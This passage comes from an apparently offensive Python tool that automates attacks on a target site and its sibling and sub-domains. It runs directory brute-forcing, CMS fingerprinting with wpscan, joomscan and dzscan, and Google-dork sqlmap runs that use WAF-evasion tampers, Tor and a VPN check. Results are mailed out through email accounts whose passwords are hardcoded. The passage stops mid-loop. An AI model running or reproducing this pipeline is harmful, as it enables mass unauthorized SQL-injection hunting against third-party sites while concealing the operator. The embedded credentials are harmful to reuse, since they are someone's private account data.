            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        script_type_scaned = get_scan_finished("script_type_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if script_type_scaned == 0:
                            single_script_type_scan(each[0])
                    else:
                        print(
                            "script_type_scan func's each[0] error in scan_way 2")
                set_scan_finished(
                    "sub_domains_script_type_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("script_type_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
            # 从数据库中获取target的旁站和子站列表,如果旁站中和子站中有相同的http_domain值
            # 也即有某个如wit.freebuf.com的url即是www.freebuf.com的旁站又是它的子站,则只在旁站中爬虫一次相同的
            # domain(wit.freebuf.com),子站中不再重复爬虫同一个domain(wit.freebuf.com)

            # 从数据库中获取target的旁站列表
            if pang_domains_script_type_scaned == 1 and sub_domains_script_type_scaned == 1:
                return
            pang_list = []
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        pang_list.append(each[0])
                        script_type_scaned = get_scan_finished("script_type_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if script_type_scaned == 0:
                            single_script_type_scan(each[0])
                    else:
                        print(
                            "script_type_scan func's each[0] error in scan_way 3")
                set_scan_finished(
                    "pang_domains_script_type_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("script_type_scan func's %s error" % sql)

            # 从数据库中获取target的子站列表并对没有在旁站中出现的http domain爬虫
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "" and each[0] not in pang_list:
                        script_type_scaned = get_scan_finished("script_type_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if script_type_scaned == 0:
                            single_script_type_scan(each[0])
                    elif each[0] in pang_list:
                        print(
                            "%s is pang domain and sub domain and will not script type scan in sub domain table since \
it has script type scanned in pang domain table" %
                            each[0])
                    else:
                        print(
                            "script_type_scan func's each[0] error in scan_way 3")
                set_scan_finished(
                    "sub_domains_script_type_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("script_type_scan func's %s error" % sql)

        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4:
            pass
        else:
            print("scan_way error in script_type_scan")


def single_dirb_scan(target):
    # 对一个target进行dirb扫描,这里的target可以为主要目标,也可以为主要目标的旁站或子站

    import os
    table_name_list = get_target_table_name_list(target)

    if 1 == get_scan_finished(
        "dirb_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        table_name_list[0],
            target):
        return
    else:
        pass

    if False == os.path.exists("dirsearch"):
        os.system("git clone https://github.com/maurosoria/dirsearch.git")

    if False == os.path.exists("log"):
        os.system("mkdir log")

    if False == os.path.exists("log/dirsearch_log"):
        os.system("cd log && mkdir dirsearch_log")
    log_file = "log/dirsearch_log/%s_log.txt" % target.split("/")[-1]
    if os.path.exists(log_file):
        pass
    else:
        result = execute_sql_in_db(
            "select script_type from %s where http_domain='%s'" %
            (table_name_list[0], target), eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) > 0:
            ext = result[0][0]
        else:
            print("get script_type error in single_dirb_scan")

        origin_log_dir = "dirsearch/reports/%s" % target.split("/")[-1]
        if False == os.path.exists(log_file):
            if (True == os.path.exists(origin_log_dir) and True == os.path.exists(origin_log_dir) and len(
                    os.listdir(origin_log_dir)) == 0) or False == os.path.exists(origin_log_dir):
                os.system(
                    "cd dirsearch && python3 dirsearch.py -u %s -t 200 -e %s --random-agents -x 301,302,500 -r" %
                    (target, ext))

            if False == os.path.exists(origin_log_dir):

                from colorama import init, Fore
                init(autoreset=True)
                print(Fore.YELLOW + target)

                print(
                    Fore.YELLOW +
                    "single_dirb_scan may be banned coz too much request to the target server")
                return
            else:
                origin_log_name_list = os.listdir(origin_log_dir)
                os.system("mv %s/%s %s" %
                          (origin_log_dir, origin_log_name_list[0], log_file))
        else:
            pass

    strings = ""
    urls_list = []
    with open(log_file, "r+") as f:
        for each_line in f:
            # 每行最后一个字符是\n
            if each_line[:3] == '200':
                url = re.search(r"(http.*)", each_line).group(1)
                if url not in urls_list and url[0:-(1 + len(url.split(".")[-1]))] + url.split(
                        ".")[-1].upper() not in urls_list and '.' in url[-6:]:
                    urls_list.append(url)
                    strings += (url + "\n")
    strings_to_write = strings[-1]

    for each_table in table_name_list:
        write_string_to_sql(
            strings_to_write,
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            each_table,
            "dirb_info",
            "http_domain",
            target)

    target_urls_table_name = target.split("/")[-1].replace(".", "_") + "_urls"
    for each_url in urls_list:
        sql_result = execute_sql_in_db(
            "select * from %s where url='%s'" %
            (target_urls_table_name, each_url), eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(sql_result) > 0:
            # 说明爬虫时已经爬到这个url,这种情况不写入数据库中
            pass
        else:
            result = get_request(each_url)
            code = result['code']
            title = result['title']
            content = result['content']
            auto_write_string_to_sql(
                str(code),
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                target_urls_table_name,
                'code',
                'url',
                each_url)
            auto_write_string_to_sql(
                str(title),
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                target_urls_table_name,
                'title',
                'url',
                each_url)
            auto_write_string_to_sql(
                content,
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                target_urls_table_name,
                'content',
                'url',
                each_url)
            # 找出like_admin登录页面
            if True == like_admin_login_content(content):
                for each_table in table_name_list:
                    auto_write_string_to_sql(
                        each_url,
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        each_table,
                        "like_admin_login_urls",
                        "http_domain",
                        http_domain)
                execute_sql_in_db(
                    "update %s set like_admin_login_url='1' where url='%s'" %
                    (target_urls_table_name, each_url), eval(get_key_value_from_config_file('config.ini','default','db_name')))
            else:
                execute_sql_in_db(
                    "update %s set like_admin_login_url='0' where url='%s'" %
                    (target_urls_table_name, each_url), eval(get_key_value_from_config_file('config.ini','default','db_name')))


def dirb_scan(target):
    # 根据scan_way的值采取的扫目录模块
    # target要求为http+domain格式
    main_target_table_name = get_main_target_table_name(target)
    http_domain_dirb_scaned = get_scan_finished(
        "dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, target)
    pang_domains_dirb_scaned = get_scan_finished(
        "pang_domains_dirb_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    sub_domains_dirb_scaned = get_scan_finished(
        "sub_domains_dirb_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    if http_domain_dirb_scaned == 1 and pang_domains_dirb_scaned == 1 and sub_domains_dirb_scaned == 1:
        return
    else:
        if http_domain_dirb_scaned == 0:
            single_dirb_scan(target)
            set_scan_finished(
                "dirb_scaned",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                main_target_table_name,
                target)
        elif http_domain_dirb_scaned == 1:
            print("main target dirb scaned")
            pass
        else:
            print("get_scan_finished error in dirb_scan func")
        if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
            if pang_domains_dirb_scaned == 1:
                return
            # 从数据库中获取target的旁站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        dirb_scaned = get_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if dirb_scaned == 0:
                            single_dirb_scan(each[0])
                            set_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_pang", each[0])
                    else:
                        print("dirb_scan func's each[0] error in scan_way 1")
                set_scan_finished("pang_domains_dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                  main_target_table_name, target)
            else:
                print("dirb_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
            if sub_domains_dirb_scaned == 1:
                return
            # 从数据库中获取target的子站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        dirb_scaned = get_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if dirb_scaned == 0:
                            single_dirb_scan(each[0])
                            set_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_sub", each[0])
                    else:
                        print("dirb_scan func's each[0] error in scan_way 2")
                    set_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                        "/")[-1].replace(".", "_") + "_sub", each[0])
                set_scan_finished("sub_domains_dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                  main_target_table_name, target)
            else:
                print("dirb_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
            # 从数据库中获取target的旁站和子站列表,如果旁站中和子站中有相同的http_domain值
            # 也即有某个如wit.freebuf.com的url即是www.freebuf.com的旁站又是它的子站,则只在旁站中爬虫一次相同的
            # domain(wit.freebuf.com),子站中不再重复爬虫同一个domain(wit.freebuf.com)

            # 从数据库中获取target的旁站列表
            if pang_domains_dirb_scaned == 1 and sub_domains_dirb_scaned == 1:
                return
            pang_list = []
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        pang_list.append(each[0])
                        dirb_scaned = get_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if dirb_scaned == 0:
                            single_dirb_scan(each[0])
                            set_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_pang", each[0])
                    else:
                        print("dirb_scan func's each[0] error in scan_way 3")
                set_scan_finished("pang_domains_dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                  main_target_table_name, target)
            else:
                print("dirb_scan func's %s error" % sql)

            # 从数据库中获取target的子站列表并对没有在旁站中出现的http domain爬虫
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "" and each[0] not in pang_list:
                        dirb_scaned = get_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if dirb_scaned == 0:
                            single_dirb_scan(each[0])
                            set_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_sub", each[0])
                    elif each[0] in pang_list:
                        print(
                            "%s is pang domain and sub domain and will not dirb scan in sub domain table since \
it has dirb scanned in pang domain table" %
                            each[0])
                        set_scan_finished("dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                    else:
                        print("dirb_scan func's each[0] error in scan_way 3")
                set_scan_finished("sub_domains_dirb_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                  main_target_table_name, target)
            else:
                print("dirb_scan func's %s error" % sql)

        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4:
            pass
        else:
            print("scan_way error in dirb_scan")


def cms_identify(target):
    # 对target进行cms识别
    # target可以是主要目标,也可以是主要目标的旁站或子站
    figlet2file("cms identifying...", 0, True)
    print(target)
    from concurrent import futures
    import time
    identified = [0]
    result = ["unknown"]
    target = [target]
    start = [time.time()]

    def check_cms(single_line):
        if identified[0] == 1:
            return
        if single_line[0] != '#':
            content = get_request(
                target[0] + single_line.split("------")[0])['content']
            if re.search(r"%s" % single_line.split("------")[1], content):
                identified[0] = 1
                end = time.time()
                print("you spend %s seconds identify cms" %
                      str(end - start[0]))
                result[0] = single_line.split("------")[1]

    def single_cms_identify(txt):
        if identified[0] == 1:
            return
        with open("cms_identify/%s" % txt, "r+", encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        with futures.ThreadPoolExecutor(max_workers=3) as executor:
            executor.map(check_cms, lines, timeout=60)

    txt_list = os.listdir("cms_identify")
    with futures.ThreadPoolExecutor(max_workers=25) as executor:
        executor.map(single_cms_identify, txt_list, timeout=60)

    if result[0] == "unknown":
        end = time.time()
        print("you spend %s seconds identify cms,but not identified" %
              str(end - start[0]))
    print("got:%s" % result[0])
    return result[0]


def single_cms_scan(target):
    # 对target根据taret的cms类型进行cms识别及相应第三方工具扫描,target可以是主要目标或者是旁站或是子站
    # target要求为http+domain格式
    figlet2file("cms scaning...", 0, True)
    print(target)
    import os
    table_name_list = get_target_table_name_list(target)
    if 1 == get_scan_finished(
        "cms_identify_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        table_name_list[0],
            target):
        if len(table_name_list) == 2:
            if get_scan_finished(
                "cms_identify_scaned",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                table_name_list[1],
                    target) == 0:
                set_scan_finished(
                    "cms_identify_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    table_name_list[1],
                    target)
        result = execute_sql_in_db(
            "select cms_value from %s where http_domain='%s'" %
            (table_name_list[0], target))
        if len(result) > 0:
            cms_value = result[0][0]
        else:
            print("execute_sqli_in_db error in single_cms_scan,got wrong cms_value")
    else:
        cms_value = cms_identify(target)
        for each_table in table_name_list:
            execute_sql_in_db(
                "update %s set cms_value='%s' where http_domain='%s'" %
                (each_table, cms_value, target), eval(get_key_value_from_config_file('config.ini','default','db_name')))
            set_scan_finished(
                "cms_identify_scaned",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                each_table,
                target)
    if cms_value == "unknown":
        pass
    else:
        if 1 == get_scan_finished(
            "cms_scaned",
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            table_name_list[0],
                target):
            if len(table_name_list) == 2:
                if get_scan_finished(
                    "cms_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    table_name_list[1],
                        target) == 0:
                    set_scan_finished(
                        "cms_scaned",
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        table_name_list[1],
                        target)
            pass
        else:

            # 下面相当于cms_scan过程
            if False == os.path.exists("log"):
                os.system("mkdir log")
            if False == os.path.exists("cms_scan_log"):
                os.system("cd log && mkdir cms_scan_log")

            if False == os.path.exists("cms_scan"):
                os.system("mkdir cms_scan")

            if cms_value == 'discuz':
                if False == os.path.exists("log/cms_scan_log/dzscan"):
                    os.system("cd log/cms_scan_log && mkdir dzscan")
                cms_scaner_list = os.listdir("cms_scan")
                if "dzscan" not in cms_scaner_list:
                    os.system(
                        "cd cms_scan && git clone https://github.com/code-scan/dzscan.git")
                log_file = target.split("/")[-1] + ".log"

                if os.path.exists("log/cms_scan_log/dzscan/" + log_file):
                    pass
                else:
                    os.system(
                        "cd cms_scan/dzscan && python dzscan.py --update && python dzscan.py -u %s --log" %
                        target)

                os.system(
                    "mv cms_scan/dzscan/%s log/cms_scan_log/dzscan/" %
                    log_file)
                with open("log/cms_scan_log/dzscan/" + log_file, "r+") as f:
                    cms_scan_result = f.readlines()
                for each_table in table_name_list:
                    if get_scan_finished(
                        "cms_scaned",
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        each_table,
                            target) == 0:
                        set_scan_finished(
                            "cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), each_table, target)
                        auto_write_string_to_sql(
                            cms_scan_result,
                            eval(get_key_value_from_config_file('config.ini','default','db_name')),
                            each_table,
                            "cms_scan_info",
                            "http_domain",
                            target)

            if cms_value == 'joomla':
                if False == os.path.exists("log/cms_scan_log/joomscan"):
                    os.system("cd log/cms_scan_log && mkdir joomscan")
                cms_scaner_list = os.listdir("cms_scan")
                if "joomscan" not in cms_scaner_list:
                    os.system("cd cms_scan && wget \
http://jaist.dl.sourceforge.net/project/joomscan/joomscan/2012-03-10/joomscan-latest.zip \
&& unzip joomscan-latest.zip -d joomscan && rm joomscan-latest.zip")
                result = get_string_from_command(
                    "perl cms_scan/joomscan/joomscan.pl")
                if re.search(
                    r'you may need to install the Switch module',
                        result):
                    os.system(
                        "sudo apt-get install libswitch-perl && perl -MCPAN -e 'install WWW::Mechanize'")
                log_file = "report/%s-joexploit.txt" % target.split("/")[-1]
                if os.path.exists("log/cms_scan_log/joomscan" + log_file):
                    pass
                else:
                    os.system(
                        "cd cms_scan/joomscan && perl joomscan.pl update && perl joomscan.pl -u %s -ot" %
                        target)

                os.system(
                    "mv cms_scan/joomscan/%s log/cms_scan_log/joomscan/ " %
                    log_file)
                with open("log/cms_scan_log/joomscan/" + log_file[7:], "r+") as f:
                    cms_scan_result = f.readlines()
                for each_table in table_name_list:
                    if get_scan_finished(
                        "cms_scaned",
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        each_table,
                            target) == 0:
                        set_scan_finished(
                            "cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), each_table, target)
                        auto_write_string_to_sql(
                            cms_scan_result,
                            eval(get_key_value_from_config_file('config.ini','default','db_name')),
                            each_table,
                            "cms_scan_info",
                            "http_domain",
                            target)

            if cms_value == 'wordpress':
                if False == os.path.exists("log/cms_scan_log/wpscan"):
                    os.system("cd log/cms_scan_log && mkdir wpscan")
                cms_scaner_list = os.listdir("cms_scan")
                if "wpscan" not in cms_scaner_list:
                    os.system(
                        "cd cms_scan && git clone https://github.com/wpscanteam/wpscan.git && cd wpscan && \
echo y | unzip data.zip")
                result = get_string_from_command(
                    "ruby cms_scan/wpscan/wpscan.rb")
                if re.search(r'ERROR', result):
                    os.system("sudo apt-get install libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev \
ruby-dev build-essential libgmp-dev zlib1g-dev")
                    os.system("gem install bundler && bundle install")
                log_file = "%s.txt" % target.split("/")[-1]
                if os.path.exists("log/cms_scan_log/wpscan/" + log_file):
                    pass
                else:
                    os.system(
                        "cd cms_scan/wpscan && ruby wpscan.rb --update && ruby wpscan.rb %s | tee %s" %
                        (target, log_file))
                    os.system(
                        "mv cms_scan/wpscan/%s log/cms_scan_log/wpscan/" %
                        log_file)
                with open("log/cms_scan_log/wpscan/" + log_file, "r+") as f:
                    cms_scan_result = f.readlines()
                for each_table in table_name_list:
                    if get_scan_finished(
                        "cms_scaned",
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        each_table,
                            target) == 0:
                        set_scan_finished(
                            "cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), each_table, target)
                        auto_write_string_to_sql(
                            cms_scan_result,
                            eval(get_key_value_from_config_file('config.ini','default','db_name')),
                            each_table,
                            "cms_scan_info",
                            "http_domain",
                            target)

    for each_table in table_name_list:
        set_scan_finished("cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), each_table, target)


def cms_scan(target):
    # 根据scan_way采取不同的cms识别扫描主要目标及旁站子站
    main_target_table_name = get_main_target_table_name(target)
    http_domain_cms_scaned = get_scan_finished(
        "cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, target)
    pang_domains_cms_scaned = get_scan_finished(
        "pang_domains_cms_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    sub_domains_cms_scaned = get_scan_finished(
        "sub_domains_cms_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    if http_domain_cms_scaned == 1 and pang_domains_cms_scaned == 1 and sub_domains_cms_scaned == 1:
        return
    else:
        if http_domain_cms_scaned == 0:
            single_cms_scan(target)
        elif http_domain_cms_scaned == 1:
            print("main target cms scaned")
            pass
        else:
            print("get_scan_finished error in cms_scan func")
        if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
            if pang_domains_cms_scaned == 1:
                return
            # 从数据库中获取target的旁站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        cms_scaned = get_scan_finished("cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if cms_scaned == 0:
                            single_cms_scan(each[0])
                    else:
                        print("cms_scan func's each[0] error in scan_way 1")
                set_scan_finished("pang_domains_cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                  main_target_table_name, target)
            else:
                print("cms_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
            if sub_domains_cms_scaned == 1:
                return
            # 从数据库中获取target的子站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        cms_scaned = get_scan_finished("cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if cms_scaned == 0:
                            single_cms_scan(each[0])
                    else:
                        print("cms_scan func's each[0] error in scan_way 2")
                set_scan_finished("sub_domains_cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                  main_target_table_name, target)
            else:
                print("cms_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
            # 从数据库中获取target的旁站和子站列表,如果旁站中和子站中有相同的http_domain值
            # 也即有某个如wit.freebuf.com的url即是www.freebuf.com的旁站又是它的子站,则只在旁站中爬虫一次相同的
            # domain(wit.freebuf.com),子站中不再重复爬虫同一个domain(wit.freebuf.com)

            # 从数据库中获取target的旁站列表
            if pang_domains_cms_scaned == 1 and sub_domains_cms_scaned == 1:
                return
            pang_list = []
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        pang_list.append(each[0])
                        cms_scaned = get_scan_finished("cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if cms_scaned == 0:
                            single_cms_scan(each[0])
                    else:
                        print("cms_scan func's each[0] error in scan_way 3")
                set_scan_finished("pang_domains_cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                  main_target_table_name, target)
            else:
                print("cms_scan func's %s error" % sql)

            # 从数据库中获取target的子站列表并对没有在旁站中出现的http domain爬虫
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "" and each[0] not in pang_list:
                        cms_scaned = get_scan_finished("cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if cms_scaned == 0:
                            single_cms_scan(each[0])
                    elif each[0] in pang_list:
                        print(
                            "%s is pang domain and sub domain and will not cms scan in sub domain table since \
it has cms scanned in pang domain table" %
                            each[0])
                    else:
                        print("cms_scan func's each[0] error in scan_way 3")
                set_scan_finished("sub_domains_cms_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                  main_target_table_name, target)
            else:
                print("cms_scan func's %s error" % sql)

        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4:
            pass
        else:
            print("scan_way error in cms_scan")


def static_sqli(url):
    # re.search("",url)
    pass


def sqlmap_g_nohuman(http_url_or_file, tor_or_not, post_or_not):
    # this function use sqlmap's "-g" option to find sqli urls,but this "-g"
    # option can only get 100 results due to google api restriction,but in
    # this mode,there is no need for us human to handle any situation.
    if re.match("(http://)|(https://)", http_url_or_file):
        domain_url = http_url_or_file[7:] if re.match(
            "(http://)", http_url_or_file) else http_url_or_file[8:]
        sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
            domain_url, http_url_or_file)
        forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
            domain_url, http_url_or_file)
        tor_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
            domain_url, http_url_or_file)
        tor_forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
            domain_url, http_url_or_file)
        #print("sqlmap_string is:%s" % sqlmap_string)
        #sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
        if not tor_or_not:
            print("sqlmap_string is:%s" % sqlmap_string)
            print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")
        elif tor_or_not:
            print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
            print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            tor_forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        sqlmap_result = get_sqlmap_result_and_save_result(http_url_or_file)
        if sqlmap_result != "":
            mail_msg_to(
                sqlmap_result,
                "2784046065@qq.com",
                "ssqqll",
                "18137062539@163.com",
                "063913ok")

    else:
        fp = open(http_url_or_file, "r+")
        all_urls = fp.readlines()
        fp.close()
        for each in all_urls:
            domain_url = each[7:] if re.match("(http://)", each) else each[8:]
            sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
                domain_url, each)
            forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
                domain_url, each)
            tor_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
                domain_url, each)
